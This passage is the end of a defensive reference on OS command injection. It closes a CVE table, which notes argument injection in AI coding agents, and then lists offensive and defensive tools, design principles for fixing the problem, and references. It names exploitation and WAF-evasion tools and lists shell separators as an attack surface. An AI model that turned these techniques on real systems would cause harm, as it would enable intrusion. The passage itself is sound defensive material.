| §2-1 (argument injection in AI agents) | Multiple (2025) | AI coding agents (MCP-based) | Argument injection in AI tool-calling flows enables arbitrary code execution on developer machines. |
| §1 + §7-1 (glob CLI exec) | CVE-2025-64756 | glob CLI (npm) | Command injection via `--cmd` flag when processing files with malicious names. |

---

## §12. Detection Tools

### Offensive Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **Commix** (Python) | All OS command injection types | Automated detection and exploitation: result-based, blind time-based, file-based, DNS/HTTP out-of-band. Supports multiple separators, encoding, and evasion techniques. |
| **SHELLING** (Burp Extension, PortSwigger) | Comprehensive payload generation | OS command injection payload generator covering all separator types, encodings, and OS variants. |
| **Argument Injection Hammer** (Burp Extension, NCC Group) | Argument injection (§2) specifically | Identifies argument injection vulnerabilities by testing leading-dash payloads against common binaries. |
| **Bashfuscator** (Python) | Linux bash payload obfuscation | Automated command obfuscation using variable expansion, encoding, string manipulation, and eval chains. |
| **DOSfuscation** (PowerShell) | Windows cmd/PowerShell obfuscation | Automated obfuscation for Windows command-line payloads using environment variables, carets, string operations. |
| **WAFFLED Fuzzer** (Python) | WAF bypass via request mutation | Grammar-based HTTP request fuzzer targeting parsing discrepancies between WAFs and backend frameworks. |
| **Interactsh** (Go, ProjectDiscovery) | Out-of-band detection infrastructure | Generates unique callback URLs/DNS subdomains for detecting blind command injection via OOB channels. |

### Defensive Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **Semgrep** | Static analysis (multi-language) | Pattern-based detection of dangerous function calls with tainted user input. Rules for `exec`, `system`, `subprocess`, `child_process`, etc. |
| **CodeQL** | Static analysis (multi-language) | Taint tracking from source (user input) to sink (command execution) across function boundaries. |
| **Snyk Code** | Static analysis (multi-language) | Real-time code scanning for command injection sinks with IDE integration. |
| **ModSecurity + CRS** | WAF (runtime) | Request pattern matching with Core Rule Set. Covers common command injection signatures but vulnerable to §6 and §8 bypasses. |
| **Cloudflare WAF** | WAF (runtime) | ML-based and signature-based detection. Continuously updated but bypassed by §8-3 techniques. |

---

## §13. Summary: Core Principles

**The root cause of all command injection is the absence of a principled boundary between data and instructions in shell interpreters.** Unlike SQL (which has parameterized queries) or HTML (which has context-aware output encoding), operating system shells were designed for interactive human use where the user *is* the authority. Every feature that makes shells powerful for humans—metacharacters, expansion, globbing, quoting, environment variables—becomes an attack surface when untrusted data enters the shell's interpretation pipeline.

**Incremental fixes fail because the mutation surface is combinatorially explosive.** A blocklist approach must account for every command separator (§1: `;`, `&&`, `||`, `|`, `&`, `\n`), every substitution syntax (§1-4: `` ` ` ``, `$()`, `$(())`), every shell expansion mechanism (§4: braces, globs, tildes, process substitution), every encoding transform (§6: hex, octal, base64, URL, Unicode, quote insertion, case manipulation, variable substring extraction), and every language-specific dangerous API (§7). Each technique can be combined with others, and new shells (zsh, fish, PowerShell) introduce additional syntax. A WAF or input filter would need to fully replicate the shell parser to reliably detect all injection—at which point it would be simpler to not invoke the shell at all.

**The structural solution is to eliminate the shell from the command execution path.** This means using array-based APIs that pass arguments directly to `execvp()` without shell interpolation (`execFile` in Node.js, `subprocess.Popen([...])` with `shell=False` in Python, multi-argument `system()` in Ruby/Perl, `ProcessBuilder` in Java). This approach eliminates the entire §1, §3, §4, §5, §6, and §8 mutation space, reducing the residual risk to argument injection (§2) alone—which is addressed by inserting `--` before user-controlled arguments and validating that input does not begin with `-`. For CI/CD contexts (§9), the structural fix is to never interpolate untrusted input into shell commands: use intermediate environment variables (`env:` in GitHub Actions) or purpose-built APIs instead.

CISA and FBI's 2024 joint advisory explicitly called on technology manufacturers to eliminate OS command injection at the design level rather than relying on input sanitization—an acknowledgment that the vulnerability class is fundamentally a *design problem*, not an *input validation problem*.

---

## References

- CISA. "Secure by Design Alert: Eliminating OS Command Injection Vulnerabilities." July 2024. https://www.cisa.gov/resources-tools/resources/secure-design-alert-eliminating-os-command-injection-vulnerabilities
- MITRE. "CWE-78: Improper Neutralization of Special Elements used in an OS Command." https://cwe.mitre.org/data/definitions/78.html
- MITRE. "CWE-77: Improper Neutralization of Special Elements used in a Command." https://cwe.mitre.org/data/definitions/77.html
- SwissKyRepo. "PayloadsAllTheThings: Command Injection." https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- SonarSource. "Argument Injection Vectors." https://sonarsource.github.io/argument-injection-vectors/
- HackTricks. "Command Injection." https://book.hacktricks.wiki/pentesting-web/command-injection.html
- Akhavani et al. "WAFFLED: Exploiting Parsing Discrepancies to Bypass Web Application Firewalls." ACSAC 2025. https://arxiv.org/abs/2503.10846
- Stasinopoulos et al. "Commix: automating evaluation and exploitation of command injection vulnerabilities." International Journal of Information Security, 2018.
- NCC Group. "Argument Injection Hammer." https://github.com/nccgroup/argumentinjectionhammer
- PortSwigger. "SHELLING - OS Command Injection Payload Generator." https://github.com/PortSwigger/command-injection-attacker
- Snyk. "Rediscovering argument injection when using VCS tools." https://snyk.io/blog/argument-injection-when-using-git-and-mercurial/
- F5 DevCentral. "WAF Evasion Techniques for Command Injection." https://community.f5.com/kb/technicalarticles/waf-evasion-techniques-for-command-injection/331312
- Aikido Security. "Command Injection in 2024 Report." https://www.aikido.dev/blog/command-injection-in-2024-unpacked
- OWASP. "OS Command Injection Defense Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html

---

*This document was created for defensive security research and vulnerability understanding purposes.*
